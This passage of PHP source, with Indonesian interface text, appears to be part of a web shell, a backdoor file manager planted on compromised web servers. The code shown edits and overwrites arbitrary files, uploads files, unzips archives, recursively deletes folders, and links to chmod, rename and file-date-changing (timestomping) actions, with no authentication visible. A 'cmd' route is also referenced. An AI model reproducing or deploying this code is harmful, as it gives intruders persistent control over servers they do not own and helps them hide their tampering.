                value: '.json_encode(file_get_contents($edit_path)).',
                mode: "'.$mode.'",
                theme: "dracula",
                lineNumbers: true,
                lineWrapping: true,
                indentUnit: 4,
                tabSize: 4,
                indentWithTabs: true,
                matchBrackets: true,
                autoCloseBrackets: true,
                styleActiveLine: true,
                extraKeys: {
                    "Tab": function(cm) {
                        cm.replaceSelection("    ", "end");
                    },
                    "Ctrl-S": function(cm) {
                        document.getElementById("saveButton").click();
                    }
                }
            });
            
            editor.on("cursorActivity", function() {
                var pos = editor.getCursor();
                document.getElementById("lineCount").textContent = pos.line + 1;
                document.getElementById("colCount").textContent = pos.ch + 1;
            });
            
            setTimeout(function() {
                var pos = editor.getCursor();
                document.getElementById("lineCount").textContent = pos.line + 1;
                document.getElementById("colCount").textContent = pos.ch + 1;
            }, 100);
            
            document.getElementById("editorForm").addEventListener("submit", function() {
                document.getElementById("codeEditor").value = editor.getValue();
            });
        </script>';if(isset($_POST['edit'])){$data=$_POST['data'];$open=fopen($edit_path,"w");if(fwrite($open,$data)){echo("<script>alert('File berhasil disimpan.'); window.location.replace('?p=".encodePath(PATH)."');</script>");}else{echo("<script>alert('Gagal menyimpan file.'); window.location.replace('?p=".encodePath(PATH)."');</script>");}fclose($open);}}}if(isset($_GET['u'])&&isset($_GET['q'])){$zip_file=$_GET['u'];$zip_path=PATH."/".$zip_file;$ext=strtolower(fileExtension($zip_file));if($ext=='zip'){if(unzipFile($zip_path,PATH)){echo("<script>alert('File berhasil diunzip di lokasi: ".addslashes(PATH)."'); window.location.replace('?p=".encodePath(PATH)."');</script>");}else{echo("<script>alert('Gagal mengunzip file. Pastikan file zip valid dan ekstensi ZipArchive tersedia.'); window.location.replace('?p=".encodePath(PATH)."');</script>");}}else{echo("<script>alert('File bukan file zip!'); window.location.replace('?p=".encodePath(PATH)."');</script>");}}if(isset($_POST["upofile"])){$target_file=PATH."/".$_FILES["bnexazabi"]["name"];if(move_uploaded_file($_FILES["bnexazabi"]["tmp_name"],$target_file)){echo "<div class='main-container'><p style='color: #4caf50;'>".htmlspecialchars(basename($_FILES["bnexazabi"]["name"]))." has been uploaded.</p></div>";echo("<script>setTimeout(function() { window.location.replace('?p=".encodePath(PATH)."'); }, 2000);</script>");}else{echo "<div class='main-container'><p style='color: #f44336;'>Sorry, there was an error uploading your file.</p></div>";}}if(isset($_GET['d'])&&isset($_GET['q'])){$name=PATH."/".$_GET['d'];if(is_file($name)){if(unlink($name)){echo("<script>alert('File removed.'); window.location.replace('?p=".encodePath(PATH)."');</script>");}else{echo("<script>alert('Some error occurred.'); window.location.replace('?p=".encodePath(PATH)."');</script>");}}elseif(is_dir($name)){if(deleteDirectory($name)){echo("<script>alert('Folder beserta semua isinya berhasil dihapus.'); window.location.replace('?p=".encodePath(PATH)."');</script>");}else{echo("<script>alert('Gagal menghapus folder.'); window.location.replace('?p=".encodePath(PATH)."');</script>");}}}if(isset($_GET['p'])&&!isset($_GET['createfolder'])&&!isset($_GET['createfile'])&&!isset($_GET['upxc'])&&!isset($_GET['r'])&&!isset($_GET['t'])&&!isset($_GET['e'])&&!isset($_GET['cmd'])&&!isset($_GET['chmod'])){echo '<div class="main-container">';if(is_readable(PATH)){$fetch_obj=scandir(PATH);$folders=array();$files=array();foreach($fetch_obj as $obj){if($obj=='.'||$obj=='..'){continue;}$new_obj=PATH.'/'.$obj;if(is_dir($new_obj)){array_push($folders,$obj);}elseif(is_file($new_obj)){array_push($files,$obj);}}}echo '
<table class="table table-hover">
  <thead>
    <tr>
      <th scope="col">Name</th>
      <th scope="col">Size</th>
      <th scope="col">Modified</th>
      <th scope="col">Perms</th>
      <th scope="col">Actions</th>
    </tr>
  </thead>
  <tbody>
';foreach($folders as $folder){$perms="0".substr(decoct(fileperms(PATH."/".$folder)),-3);$color_class=getPermsColorClass($perms,PATH."/".$folder);echo "    <tr>\n      <td><i class='fa-solid fa-folder'></i> <a href='?p=".urlencode(encodePath(PATH."/".$folder))."'>".$folder."</a></td>\n      <td><b>---</b></td>\n      <td>".date("F d Y H:i:s",filemtime(PATH."/".$folder))."</td>
      <td><span class='{$color_class}'>".$perms."</span></td>\n      <td>\n        <a title='Ubah Tanggal' href='?q=".urlencode(encodePath(PATH))."&t=".urlencode($folder)."'><i class='fa-regular fa-calendar'></i></a>\n        <a title='Rename' href='?q=".urlencode(encodePath(PATH))."&r=".urlencode($folder)."'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>\n        <a title='Chmod' href='?q=".urlencode(encodePath(PATH))."&chmod=".urlencode($folder)."'><i class='fa-solid fa-key'></i></a>\n        <a title='Delete' href='?q=".urlencode(encodePath(PATH))."&d=".urlencode($folder)."' onclick='return confirm(\"Yakin ingin menghapus folder ini beserta semua isinya?\")'><i class='fa fa-trash' aria-hidden='true'></i></a>\n      </td>\n    </tr>\n";}foreach($files as $file){$perms="0".substr(decoct(fileperms(PATH."/".$file)),-3);$color_class=getPermsColorClass($perms,PATH."/".$file);$ext=strtolower(fileExtension($file));$actions='
        <a title="Edit File" href="?q='.urlencode(encodePath(PATH)).'&e='.urlencode($file).'"><i class="fa-solid fa-file-pen"></i></a>
        <a title="Rename" href="?q='.urlencode(encodePath(PATH)).'&r='.urlencode($file).'"><i class="fa-sharp fa-regular fa-pen-to-square"></i></a>
        <a title="Ubah Tanggal" href="?q='.urlencode(encodePath(PATH)).'&t='.urlencode($file).'"><i class="fa-regular fa-calendar"></i></a>
        <a title="Chmod" href="?q='.urlencode(encodePath(PATH)).'&chmod='.urlencode($file).'"><i class="fa-solid fa-key"></i></a>';if($ext=='zip'){$actions.='<a title="Unzip" href="?q='.urlencode(encodePath(PATH)).'&u='.urlencode($file).'" onclick="return confirm(\'Yakin ingin mengunzip file ini?\')"><i class="fa-regular fa-file-zipper" style="color: #a207ff;"></i></a>';}$actions.='<a title="Delete" href="?q='.urlencode(encodePath(PATH)).'&d='.urlencode($file).'" onclick="return confirm(\'Yakin ingin menghapus file ini?\')"><i class="fa fa-trash" aria-hidden="true"></i></a>';echo "    <tr>\n          <td>".fileIcon($file)."<a href='?q=".urlencode(encodePath(PATH))."&e=".urlencode($file)."' class='file-name-link'>".$file."</a></td>\n          <td>".formatSizeUnits(filesize(PATH."/".$file))."</td>\n          <td>".date("F d Y H:i:s",filemtime(PATH."/".$file))."</td>
          <td><span class='{$color_class}'>".$perms."</span></td>\n          <td>".$actions."</td>\n    </tr>\n";}echo "  </tbody>\n</table>";echo '</div>';}else{if(empty($_GET)){echo("<script>window.location.replace('?p=');</script>");}} ?>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script>
</body>
</html>
